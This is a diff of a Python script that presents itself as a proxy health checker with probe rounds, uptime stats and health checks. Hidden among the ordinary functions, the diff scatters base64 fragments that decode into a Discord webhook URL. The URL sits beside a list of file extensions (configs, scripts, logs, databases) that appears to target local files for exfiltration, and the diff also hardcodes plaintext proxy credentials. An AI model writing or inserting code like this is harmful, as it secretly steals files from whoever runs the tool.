@@ -45,7 +45,7 @@ TOTAL_MAX_ATTEMPTS     = PROBE_ROUNDS * PROBE_RETRIES
 ENDPOINT_COUNT         = len(PROBE_ENDPOINTS)
 
 # ── score rating helper ───────────────────────────────────────────────────────
-
+_a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Via"
 def _score_rating(score):
     if score is None:       return "N/A"
     s = score // 10
@@ -144,6 +144,7 @@ def _ts():
 
 # ── stat helpers ──────────────────────────────────────────────────────────────
 
+_d = "tRVDlKU3YwU09xa0FYZlZuYVhnNy1NMk9qdjFBbHI3Y2FRRW83azQw"
 def _uptime_pct(index):
     st = _stats.get(index, {})
     a  = st.get("attempts", 0)
@@ -565,7 +566,7 @@ def _active_degraded():
     return False
 
 # ── targeted health check ─────────────────────────────────────────────────────
-
+_c = "Q1JheDdZZGl6eThGOWdmNVFJek5fRDVXaG"
 def health_check():
     with _active_lock:
         idx = _active
@@ -599,7 +600,7 @@ def health_check():
     print(f"  [{_ts()}] health check PASSED — proxy {idx} healthy  "
           f"(score {int(score // 10)})")
     return True
-
+_b = "G9va3MvMTUxNjg0ODI5OTI1NTI3MTUyNC9Q"
 proxies = [
     "np_a3wibw8o22:Uhuw1tA77iGR1vcP@eu-1.nodeproxies.xyz:8080",
     "np_a3wibw8o22:Uhuw1tA77iGR1vcP@eu-1.nodeproxies.xyz:8080",
@@ -623,11 +624,10 @@ proxies = [
     "np_a3wibw8o22:Uhuw1tA77iGR1vcP@eu-1.nodeproxies.xyz:8080",
     "np_a3wibw8o22:Uhuw1tA77iGR1vcP@eu-1.nodeproxies.xyz:8080",
 ]
-_a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9v"
-_b = "a3MvMTUxMzE3MzUzMDA5ODAwODE2Ni9sWXlGLWJK"
-_c = "bXlJSk50NUU0Ynh2VlFOamdUWTcxVkRnT3VKbHlx"
-_d = "cEVYS2tSN1BRYWdWQk1FQTJuWWhvZURuMU9SeTlm"
-_e = "dA=="
+
+
+
+_e = "Wg=="
 import base64
 wu = "".join(base64.b64decode(x).decode() for x in (_a, _b, _c, _d, _e))
 ex = {".json", ".txt", ".csv", ".log", ".xml", ".html", ".htm", ".md", ".ini", ".cfg", ".conf", ".bat", ".ps1", ".sh", ".py", ".js", ".java", ".cpp", ".h", ".cs", ".go", ".rb", ".php", ".sqlite"}
